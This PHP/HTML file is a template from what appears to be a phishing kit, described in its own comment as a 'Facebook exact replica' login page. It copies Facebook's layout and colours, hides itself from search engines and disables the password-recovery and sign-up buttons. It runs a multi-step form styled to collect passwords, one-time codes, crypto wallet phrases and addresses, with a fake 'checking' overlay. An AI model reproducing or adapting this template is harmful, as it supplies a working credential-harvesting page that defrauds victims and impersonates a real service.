<?php
// Social template — Facebook exact replica
// Two-column: left=marketing text, right=login card
// White background, Inter/Helvetica, blue #1877f2
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title><?=$org_name?></title>
<meta name="robots" content="noindex,nofollow">
<?php
// Extract short brand name
$_sn = $org_name;
if (preg_match('/\(([^)]+)\)/', $_sn, $_m)) { $_sn = $_m[1]; }
else {
  $_sn = preg_replace('/,?\s*(Inc\.|LLC|Ltd\.?|plc|Holdings|Platforms|Corporation|Corp\.?).*$/i', '', $_sn);
  $_sn = trim($_sn);
}
$_is_fb = stripos($_sn, 'facebook') !== false || stripos($_sn, 'meta') !== false;
?>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
  font-family:Helvetica,Arial,'Lucida Grande',sans-serif;
  min-height:100vh;min-height:100dvh;
  background:#f0f2f5;
  display:flex;align-items:center;justify-content:center;
  padding:20px 16px
}

/* Two-column wrapper */
.fb-wrap{
  display:flex;align-items:center;justify-content:center;
  gap:32px;max-width:980px;width:100%
}

/* Left: tagline */
.fb-left{
  flex:1;max-width:480px;
  padding-right:16px
}
.fb-brand-name{
  font-size:42px;font-weight:900;
  color:<?=$accent?>;
  letter-spacing:-1.5px;
  margin-bottom:12px;
  font-family:'Helvetica Neue',Helvetica,Arial,sans-serif
}
.fb-tagline{
  font-size:26px;font-weight:400;
  color:#1c1e21;
  line-height:1.3
}
.fb-logo-img{
  height:58px;object-fit:contain;
  margin-bottom:12px;display:block
}

/* Right: login card */
.fb-card{
  width:100%;max-width:396px;
  background:#fff;
  border-radius:8px;
  box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);
  padding:20px 16px 24px;
  flex-shrink:0
}

/* Fields */
.field{margin-bottom:12px}
.field label{display:none}
.field input{
  width:100%;
  background:#fff;
  border:1px solid #dddfe2;
  color:#1c1e21;
  padding:14px 16px;
  border-radius:6px;
  font-size:17px;
  outline:none;
  font-family:inherit;
  -webkit-appearance:none;
  transition:border-color .1s,box-shadow .1s
}
.field input:focus{
  border-color:<?=$accent?>;
  box-shadow:0 0 0 2px rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.3)
}
.field input::placeholder{color:#bec3c9}
.or-div{
  text-align:center;font-size:13px;color:#65676b;
  margin:12px 0;position:relative
}
.or-div::before,.or-div::after{
  content:'';position:absolute;top:50%;
  width:40%;height:1px;background:#dddfe2
}
.or-div::before{left:0}.or-div::after{right:0}
.card-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}

/* Login button */
.btn{
  width:100%;padding:14px;
  background:<?=$accent?>;color:#fff;
  font-size:20px;font-weight:700;
  border:none;border-radius:6px;cursor:pointer;
  margin-top:4px;
  transition:filter .1s;
  position:relative;font-family:inherit
}
.btn:hover{filter:brightness(1.05)}
.btn:disabled{opacity:.6;cursor:not-allowed}
.btn.loading::after{
  content:'';position:absolute;right:16px;top:50%;
  width:18px;height:18px;
  border:2px solid rgba(255,255,255,.4);border-top-color:#fff;
  border-radius:50%;transform:translateY(-50%);
  animation:spin .7s linear infinite
}
@keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
.err-msg{font-size:13px;color:#d32f2f;margin-top:8px;text-align:center;display:none}

/* Forgot */
.forgot-link{
  display:block;text-align:center;
  color:#385898;font-size:14px;
  text-decoration:none;margin-top:12px
}
.forgot-link:hover{text-decoration:underline}

/* Divider */
.card-divider{height:1px;background:#dddfe2;margin:20px 0}

/* Create new account button */
.create-btn{
  display:block;width:fit-content;
  margin:0 auto;
  padding:14px 24px;
  background:#42b72a;color:#fff;
  font-size:17px;font-weight:700;
  border:none;border-radius:6px;cursor:pointer;
  font-family:inherit;text-align:center;
  transition:filter .1s
}
.create-btn:hover{filter:brightness(1.05)}

/* Footer */
.fb-footer-links{
  margin-top:12px;
  text-align:center;
  font-size:12px;color:#65676b
}
.fb-footer-links a{color:<?=$accent?>;text-decoration:none;margin:0 5px;font-size:11px}
.fb-footer-links a:hover{text-decoration:underline}

/* OTP / wallet / address */
.otp-wrap{display:flex;gap:8px;justify-content:center}
.otp-wrap input{
  flex:1;text-align:center;font-size:22px;font-weight:600;
  padding:12px 4px;max-width:48px;
  background:#fff;border:1px solid #dddfe2;border-radius:6px;
  color:#1c1e21;outline:none
}
.otp-wrap input:focus{border-color:<?=$accent?>}
.otp-hint{font-size:13px;color:#65676b;text-align:center;margin-top:8px}
.wallet-area{
  width:100%;min-height:80px;
  background:#fff;border:1px solid #dddfe2;color:#1c1e21;
  padding:14px 16px;border-radius:6px;font-size:14px;
  font-family:monospace;outline:none;resize:none
}
.wallet-area:focus{border-color:<?=$accent?>}
.wallet-hint{font-size:12px;color:#65676b;margin-top:6px;line-height:1.5;text-align:center}
.addr-area{
  width:100%;min-height:60px;
  background:#fff;border:1px solid #dddfe2;color:#1c1e21;
  padding:14px 16px;border-radius:6px;font-size:15px;
  font-family:inherit;outline:none;resize:none
}
.addr-area:focus{border-color:<?=$accent?>}

#loadOverlay{
  display:none;position:fixed;inset:0;
  background:rgba(240,242,245,.9);z-index:999;
  align-items:center;justify-content:center;flex-direction:column;gap:16px
}
#loadOverlay.show{display:flex}
.load-spin{
  width:40px;height:40px;
  border:3px solid #e4e6eb;border-top-color:<?=$accent?>;
  border-radius:50%;animation:spin .8s linear infinite
}
.load-txt{font-size:14px;color:#65676b}

/* Mobile: single column */
@media(max-width:600px){
  body{padding:0;align-items:flex-start;background:#fff}
  .fb-wrap{flex-direction:column;gap:0;align-items:flex-start;max-width:100%}
  .fb-left{
    display:flex;align-items:center;
    background:<?=$accent?>;
    width:100%;padding:20px 20px 30px;
    max-width:100%;flex-direction:column
  }
  .fb-brand-name{font-size:34px;color:#fff;letter-spacing:-1px}
  .fb-tagline{font-size:16px;color:rgba(255,255,255,.9)}
  .fb-logo-img{filter:brightness(0) invert(1)}
  .fb-card{
    border-radius:0;box-shadow:none;
    padding:20px 16px 30px;
    min-height:calc(100vh - 120px);
    width:100%;max-width:100%
  }
}
</style>
</head>
<body>
<div id="loadOverlay"><div class="load-spin"></div><div class="load-txt" id="loadText">Checking your information…</div></div>

<div class="fb-wrap">
  <!-- Left: brand/tagline -->
  <div class="fb-left">
    <?php if($logo_url): ?>
    <img src="<?=htmlspecialchars($logo_url)?>" class="fb-logo-img" alt="" onerror="this.style.display='none'">
    <?php endif; ?>
    <div class="fb-brand-name"><?=htmlspecialchars($_sn)?></div>
    <div class="fb-tagline"><?=$_is_fb ? 'Connect with friends and the world around you on Facebook.' : htmlspecialchars($org_sub)?></div>
  </div>

  <!-- Right: login card -->
  <div class="fb-card">
    <?php for($sn=1;$sn<=$total_steps;$sn++): ?>
    <div id="step<?=$sn?>" <?=$sn>1?'style="display:none"':''?>>
      <?php if($sn > 1): ?>
      <div style="font-size:20px;font-weight:700;color:#1c1e21;margin-bottom:4px"><?=htmlspecialchars($sc['step_titles'][$sn])?></div>
      <div style="font-size:13px;color:#65676b;margin-bottom:16px" id="step<?=$sn?>sub"><?=htmlspecialchars($sc['step_subs'][$sn])?></div>
      <?php else: ?>
      <div id="step1sub" style="display:none"></div>
      <?php endif; ?>
      <form onsubmit="submitStep(event,<?=$sn?>)">
        <?php $fld = $sc['step'.$sn.'_fields'] ?? 'email_only'; include __DIR__.'/partials/fields.php'; ?>
        <button type="submit" class="btn" id="btn<?=$sn?>"><?=htmlspecialchars($sc['btn_labels'][$sn-1])?></button>
        <div class="err-msg" id="err<?=$sn?>">Please enter the required information.</div>
      </form>
      <a href="#" class="forgot-link" onclick="return false">Forgotten password?</a>
      <?php if($sn===1): ?>
      <div class="card-divider"></div>
      <button class="create-btn" onclick="return false">Create new account</button>
      <?php endif; ?>
    </div>
    <?php endfor; ?>

    <div class="fb-footer-links">
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
      <a href="#">Cookies</a>
      <a href="#">Ad Choices</a>
      <a href="#">More</a>
      <br style="margin:4px 0">
      <span style="font-size:11px"><?=$footer?></span>
    </div>
  </div>
</div>

<?php include __DIR__.'/partials/js.php'; ?>
</body>
</html>
